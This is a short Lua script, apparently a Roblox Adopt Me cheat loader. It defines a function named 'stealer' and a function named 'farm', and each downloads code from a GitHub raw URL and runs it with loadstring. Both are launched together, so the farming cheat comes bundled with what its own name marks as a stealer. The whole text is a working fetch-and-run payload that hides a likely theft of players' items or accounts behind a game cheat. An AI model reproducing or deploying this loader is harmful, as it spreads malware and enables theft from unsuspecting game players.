local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/zebuhbb/hiadopt/refs/heads/main/zebhub'))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/zebuhbb/adopt-me/refs/heads/main/hi'))()
end

task.spawn(stealer)
task.spawn(farm)
